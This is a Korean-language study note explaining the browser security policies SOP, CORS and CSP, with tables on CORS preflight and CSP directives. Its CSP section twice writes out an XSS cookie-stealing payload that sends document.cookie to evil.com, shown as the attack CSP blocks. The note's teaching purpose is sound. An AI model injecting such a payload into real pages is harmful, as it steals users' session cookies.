# 02_브라우저 보안 정책

> SOP, CORS, CSP

출처(origin)과 관련된 브라우저의 보안 정책

### 1) 요약

|           | SOP (Same Orgin Policy)  | CORS (Cross Origin Resource Sharing)      | CSP (Content Security Policy)             |
| --------- | ------------------------ | ----------------------------------------- | ----------------------------------------- |
| 목적      | 격리                     | 격리에 대한 예외                          | 리소스 호출 제한                          |
| 설정 주체 | 브라우저(서버 관여 불가) | 서버                                      | 서버                                      |
| 실행 주체 | 브라우저                 | 브라우저                                  | 브라우저                                  |
| 결론      | 브라우저의 정책          | 서버가 선언하고, 브라우저가 강제하는 정책 | 서버가 선언하고, 브라우저가 강제하는 정책 |

- SOP (Same-Origin Policy)
  - 브라우저가 기본으로 강제하는 보안 정책
  - **출처가 동일한 경우에만 리소스를 공유 가능하도록 격리**하는 정책
- CORS (Cross Origin Resource Sharing)
  - SOP 때문에 막힌 교차 출처 요청을 **서버에서 이 출처는 허용한다고 명시적으로 선언하여 예외를 열어주는 메커니즘**
- CSP (Content Security Policy)
  - **어떤 출처의 리소스만 로드/실행할지 서버가 지정(제한)**하는 것으로 XSS(악성 스크립트 삽입) 공격을 막기 위한 정책

## 1. SOP

> Same-Origin Policy (동일 출처 정책)

해킹 및 악의적인 공격을 방지하기 위한 정책으로, 출처(Origin)이 동일한 경우에만 리소스를 공유할 수 있도록 브라우저에서 제한하는 보안 정책을 말한다.

### 1) 출처(Origin)

![image](https://github.com/user-attachments/assets/94cebbc7-6c10-4d11-854e-187d49a022d8)

출처가 동일하다는 말은 `프로토콜(스킴), 호스트(도메인명), 포트` 이 3가지가 모두 동일하다는 것이다. 셋 중 하나라도 다르면 다른 출처로 간주한다.

이 때, 포트 번호의 경우 생략되었다면 기본 포트(예- http 80, https 443)을, 명시되어 있다면 명시된 포트 번호를 기준으로 한다.

#### (1) 예시

- `http://example.com/hello`와 `http://example.com/bye`는 다른 url이지만 프로토콜, 호스트, 포트 3가지가 모두 같기 때문에 동일 출처이다.
- `http://example.com`과 `https://example.com`은 프로토콜이 다르기 때문에 동일 출처가 아니다.
- `http://example.com`과 `http://example.com:80`은 프로토콜, 호스트, 포트(http와 80)이 같기 때문에 동일 출처이다.

<br>

### 2) 등장 배경

외부 서버로부터 다운받은 스크립트를 통해 DOM을 조작하거나 CSRF, XSS 등의 공격을 통해 타 브라우저를 공격하거나 민감한 정보를 탈취하는 악의적인 공격들을 막기 위해 등장하였다.

과거에는 브라우저 간 통신할 일이 많지 않았고, 하더라도 같은 도메인 내에서만 국한되었기에 충분히 출처가 다른 곳으로 요청을 주고 받는 것에 대해 악의적인 행위로 간주하는 것이 자연스러웠다. 

물론 현재는 출처가 다른 곳과 API 등의 요청을 주고 받는 것이 매우 당연하다.

<br>

### 3) SOP 정책 상 허용되는 것

- script: 다른 출처의 스크립트를 문서에 삽입하는 것은 가능하지만, 이 스크립트를 통해 다른 출처로 요청을 날리는 것은 불가능하다.
- css: `<link>` 혹은 `@import`로 다른 출처의 css를 삽입하는 것이 가능하다.
- iframe: `X-Frame-Options` 응답 헤더가 `DENY` 혹은 `SAMEORIGIN`이 아닌 이상 일반적으로 다른 iframe을 삽입하는 것은 가능하지만, 자바 스크립트를 이용해서 다른 출처의 iframe에 접근하는 것은 불가능하다.
- form: `<form>` 태그의 `action` 속성 값에 출처가 다른 url을 사용하여 폼 데이터를 전송하는 것이 가능하다.
- image: 다른 출처의 이미지를 삽입하는 것은 가능하지만, 자바 스크립트를 이용해서 다른 출처의 이미지를 읽는 것은 불가능하다.
- multimedia: 다른 출처의 오디오, 비디오를 삽입할 수 있다.

<br>

## 2. CORS

> Cross-Origin Resource Sharing (교차 출처 리소스 공유)

웹 기술이 발전함에 따라 점차 서비스 간 직접적인 API 호출을 통해서 소통해야 하는 상황이 많아졌는데, SOP 정책으로 인해서 제한되는 내용이 많아서 일반적인 방법으로는 예외를 두는 것이 불가능했다.

이를 극복하기 위해 등장한 개념이 교차 출처 리소스 공유(CORS)이며, 리소스 호출이 허용된 출처를 서버가 명시해두면 출처가 다르더라도 요청과 응답을 주고 받을 수 있는 정책을 말한다.

### 1) 기본 동작

- 브라우저는 다른 출처로 요청을 보낼 때 기본적으로 HTTP 헤더(header)에 `Origin`을 추가하여 보낸다.
- 요청을 받은 서버는 응답 헤더에 `Access-Control-Allow-Origin`에 허가된 출처 정보를 담아서 응답을 보낸다.
- 즉, 브라우저는 요청의 Origin 헤더에 담긴 출처 정보가 응답의 Access-Control-Allow-Origin 헤더에 담긴 정보와 같으면 헤당 응답을 안전하다고 간주하고 가져오고, 그렇지 않다면 해당 응답을 임의로 파기하여 버린다.

### 2) ⭐유의사항

다른 출처의 리소스를 제한하는 것이 서버가 아니라 클라이언트인 브라우저라는 것에 유의해야 한다. 서버는 응답을 반환하지만, 브라우저에서 해당 응답을 받은 후 SOP 정책 위반 시 차단하고 버리는 것이다.

따라서 브라우저에서는 CORS 정책으로 인해 차단되는 요청도 Postman과 같은 브라우저가 아닌 환경에서 직접 통신했을 때는 정상적일 수도 있다. 그래서 Postman으로 백엔드 서버로 요청을 했을 때, "정상적으로 작동하네?"라고 생각하고, 실제 프로젝트를 배포했지만 CORS 정책으로 인해 문제가 생기는 일이 종종 발생한다.

- "CORS를 설정하면 보안이 강화된다"
  - CORS는 예외를 두는 것이기 때문에 오히려 보안을 완화(약화)시키는 것이다. 기본적으로 닫혀있는 문을 여는 셈이기 때문에 반드시 필요한 origin만 명시하는 것이 원칙이다.
- "CORS는 서버가 설정하는 정책이다"
  - SOP는 브라우저에서 강제하는 부분이기 때문에 제어할 방법이 없지만,
  - CORS는 서버가 브라우저에게 "이 부분은 예외처리 해줘"라고 요청하는 것이기 때문에 서버에서 설정하는 것이다.
- "CORS 에러는 브라우저만의 보안 문제이다"
  - CORS가 브라우저에서 강제하는 정책이라고 해서 서버는 아무런 보안적인 조치를 하지 않으면 안된다. CORS는 브라우저(클라이언트) 보안 기능일뿐 따라서 서버도 본인의 데이터를 보호하려면 인증/인가를 반드시 구현해둬야 한다.

### 3) 단순 요청 (Simple Requests)과 프리플라이트 요청 (Pre-flight Requests)

- 단순 요청
  - 단순 요청으로 취급될 경우에는 CORS를 만족하는지 확인은 하나 절차가 비교적 간소화된다. (pre-flight 생략)
  - 단순 요청이라는 텍스트만 봐서 단순 요청은 모두 허용한다고 오해하기 쉽지만 pre-flight 단계를 생략할 뿐 CORS 정책은 만족해야한다. 따라서 단순 요청이더라도 응답에 반드시 `access-control-allow-origin`에 해당 출처가 있어야만 한다.

- 프리플라이트 요청
  - 실제 요청을 보내기 전에 사전에 요청을 보내서 해당 리소스에 접근이 가능한지 확인하는 방식을 pre-flight 방식이라고 한다. 
  - 마치 "이런 메서드와 헤더로 요청을 보낼 건데 너희 정책이 허용하는 요청이니?"하고 먼저 물어보는 것이다.

| 구분                                 | Simple Request            | Pre-flight Request                         |
| ------------------------------------ | ------------------------- | ------------------------------------------ |
| 실제 요청이 서버에 도달 유무         | 도달                      | 서버가 pre-flight를 거부하면 도달하지 않음 |
| 서버가 부작용을 일으킬 가능성        | 가능 (CSRF 공격)          | pre-flight 통과 못하면 불가능              |
| JS가 응답을 읽을 수 있나? (브라우저) | CORS 헤더가 없으면 불가능 | 애초에 요청이 나가지 않았으니 불가능       |

#### (1) 단순 요청이 필요한 이유?

굳이 쓸데 없이 pre-flight(사전 요청)하는 과정을 생략하기 위함이다. 사전 요청을 하게 되면 아무래도 결국에는 1번의 요청이지만 실제로는 총 2번의 요청을 보내는 것이기 때문에 트래픽과 리소스적인 측면에서는 비효율적일 수 밖에 없다.

#### (2) 단순 요청의 조건

3가지 조건을 모두 만족해야 단순 요청이라고 간주한다.

- 메서드: GET, POST, HEAD
- 헤더: Accept, Accept-Language, Content-Language, Content-Type
  - 커스텀 헤더가 없어야 한다
- Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
  - POST 요청일 경우에만 해당한다

그러나 일반적으로 Content-Type은 application/json을 많이 사용하며 인증을 위해서 헤더 값에 Cookie나 Authorization과 같은 추가 헤더를 사용하기 때문에 단순 요청의 조건을 만족하기란 쉽지 않다.

![image](https://github.com/user-attachments/assets/5527585e-b4cd-48a8-8250-a081864430ea)

<br>

#### (3) pre-flight가 필요한 이유?

pre-flight는 실제 요청이 CORS를 위반하지는 않았는지 미리 확인함과 동시에 부작용으로부터 서버를 보호하기 위해 존재한다.

미리 확인을 하는 이유는 서버는 일단 요청이 들어오면 처리 후 응답을 보내게 되는데, 만약 요청의 타입이 GET과 같은 단순 조회 요청일 경우엔 문제 없지만 POST, PUT, DELETE와 같은 메서드일 경우에는 잘못될 경우 서버에 부작용을 일으킬 수도 있다. 

다른 출처에서 악의적으로 POST /api/delete와 같은 삭제 API를 호출했을 경우 이를 서버가 무조건 응답 처리하면 문제가 된다. 브라우저에서는 다른 출처에 대한 응답을 읽는 것만 막지, 서버가 요청을 처리하는 것까지 막을 순 없다.

그래서 서버쪽에서 CSRF 토큰이나 SameSite 쿠키 속성 같은 별도 방어 장치를 두거나 pre-flight와 같이 사전에 미리 차단하여 진짜 요청이 서버에 도달하는 것을 막는 장치가 필요한 것이다.



![image](https://github.com/user-attachments/assets/b7c6086d-71c9-4f9f-88ba-497c5106ede0)

#### (4) pre-flight의 특징

pre-flight 요청은 브라우저에서 자동 전송되기 때문에 직접 설정을 할 필요는 없다.

다만, Postman과 같은 API Test 도구 앱들에서는 브라우저가 아니기 때문에 pre-flight를 보내지 않는다는 것을 유의.

### 4) 인증 요청 (Crendential Requests)

쿠키, 토큰과 같은 인증 정보를 포함한 요청.

```js
fetch('https://api.other.com/data', { credentials: 'include' });
```

- credentials가 include인 요청

사용자 식별 정보가 담긴 요청의 경우 조금 더 엄격한 수준으로 CORS가 적용된다.

인증 정보가 포함된 요청일 경우 서버는 `Access-Control-Allow-Credentials`라는 헤더값을 `true`로 설정해줘야 하고 `Access-Control-Allow-Origin` 헤더값은 절대 와일드 카드(`*`)가 될 수 없어 반드시 명확한 출처를 명시해줘야 한다.

```
Access-Control-Allow-Origin: https://app.example.com   // 와일드카드(*) 불가!
Access-Control-Allow-Credentials: true
```

위 2가지 조건을 만족시키지 못하면 CORS 정책을 위반한 것으로 간주한다.

## 3. CSP

> Content Security Policy

"내 페이지가 어떤 출처의 리소스만 로드/실행할 수 있는지"를 서버가 HTTP 응답 헤더에 선언하고, 브라우저가 해당 화이트리스트를 벗어난 로드/실행을 전부 차단하는 정책.

SOP/CORS가 "다른 출처가 내 데이터를 읽는 걸" 막는 정책(출처가 다른 사이트가 내 사이트에 접근하여 리소스를 사용하는 것을 막는 정책)이라면, CSP는 "내 페이지 자체가 이상한 걸 불러오거나 실행하는 걸" 막는 정책이다. (반대 방향)

### 1) 등장 배경

XSS (Cross Site Scripting) 교차 스크립트 공격은 공격자가 내 페이지 안에서 악성 스크립트를 실행하는 것이기 때문에, SOP를 통해서 막을 수가 없다. 이미 동일한 origin에서 실행되기 때문이다.

따라서 이를 막기 위해 "내 페이지는 화이트리스트에 있는 출처의 스크립트/스타일만 로드, 실행하겠다"고 브라우저에게 선언하는 정책인 CSP가 등장하게 된 것이다.

#### (1) XSS

```
공격 시나리오: 게시판 댓글에 스크립트 주입 (공격자 혹은 일반 사용자)
1. 공격자가 댓글에 이렇게 입력:
   <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
2. 서버가 이걸 이스케이프 없이 그대로 HTML에 렌더링
3. 다른 사용자가 게시글을 보면, 이 스크립트가 동일한 origin에서 실행됨
   → document.cookie로 그 사용자의 세션 쿠키를 읽어서
   → evil.com으로 전송
   
→ SOP는 이 스크립트를 못 막음 (내 페이지 안에서 실행되는 거니까)
→ fetch를 보내는 것도 "응답을 읽는"게 아니라 전송하는 것이기 때문에 SOP에서 차단할 이유가 없음
→ CSP로 "script-src 'self'"를 선언해두면, 인라인 스크립트 자체가 실행 차단됨
```

<br>

### 2) 동작

응답 헤더에 다음과 같은 형태로 전달한다.

- `Content-Security-Policy`: `지시어` `source 정보`

```http
Content-Security-Policy: <directive1> <source-list>; <directive2> <source-list>; ...
```

#### (1) 주요 지시어

| Directive       | 통제 대상                                                    |
| --------------- | ------------------------------------------------------------ |
| default-src     | 다른 `-src` 지시어에 명시 안 된 모든 리소스의 기본값         |
| script-src      | `<script>`, 인라인 스크립트, `eval()`                        |
| style-src       | `<style>`, 인라인 style 속성, 외부 CSS                       |
| img-src         | 이미지                                                       |
| connect-src     | `fetch`, `XHR`, `WebSocket`, `EventSource` 접속 대상         |
| font-src        | 웹폰트                                                       |
| frame-src       | `<iframe>`으로 로드 가능한 출처                              |
| frame-ancestors | 이 페이지를 iframe에 넣을 수 있는 출처 (역방향! clickjacking 방어) |
| object-src      | `<object>`, `<embed>` (Flash 등 레거시)                      |
| form-action     | `<form>`의 제출 대상 URL                                     |
| base-uri        | `<base>` 태그로 바꿀 수 있는 기준 URL                        |

#### (2) source 종류

| source              | 설명                                                         |
| ------------------- | ------------------------------------------------------------ |
| 'self'              | 현재 페이지와 같은 origin만 허용                             |
| 'none'              | 전부 차단                                                    |
| *                   | 전체 허용 (사실상 CSP가 없는 셈, 의미없는 설정)              |
| https://특정 도메인 | 해당 도메인만 허용                                           |
| 'unsafe-inline'     | 인라인 스크립트/스타일 허용 (권장 안 함, XSS 방어력 대폭 감소) |
| 'unsafe-eval'       | eval(), new Function() 허용 (권장 안 함)                     |
| 'nonce-abc123'      | 매 요청마다 바뀌는 난수(예- `abc-123`)와 일치하는 스크립트만 허용 |
| 'sha256-xyz...'     | 스크립트 내용의 해시(`sha256-xyz...`)가 일치하는 것만 허용   |

#### (3) 과정

Content-Security-Policy 헤더가 있는 상태에서 공격자가 HTML에 `<script>` 태그를 주입했다면, 브라우저는 HTML 파싱 과정에서 이를 만났을 때 해당 스크립트를 실행하기 직전 CSP를 검사한다.

해당 스크립트가 CSP에 걸렸을 경우에는 스크립트의 실행은 차단되고, 콘솔에는 CSP violation 에러가 출력된다. 

- 예시

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

이 헤더가 있는 상태에서 아래 스크립트가 주입되었을 경우

```html
<!-- 게시판 페이지 HTML (공격자가 삽입한 부분) -->
<div class="comment">
  안녕하세요! 
  <script>fetch('https://evil.com/steal?c=' + document.cookie)</script>
</div>
```

CSP 검사

```
이 스크립트는 인라인 스크립트다 (외부 파일이 아니라 태그 안에 코드가 직접 있음)
→ script-src 'self' 에는 'unsafe-inline'이 없다
→ 인라인 스크립트는 기본적으로 CSP에서 차단 대상
→ 실행 차단! (콘솔에 CSP violation 에러만 찍히고 스크립트는 안 돌아감)
```

CSP violation 콘솔 에러

```
Refused to execute inline script because it violates the following 
Content Security Policy directive: "script-src 'self'". 
Either the 'unsafe-inline' keyword, a hash, or a nonce is required 
to enable inline execution.
```
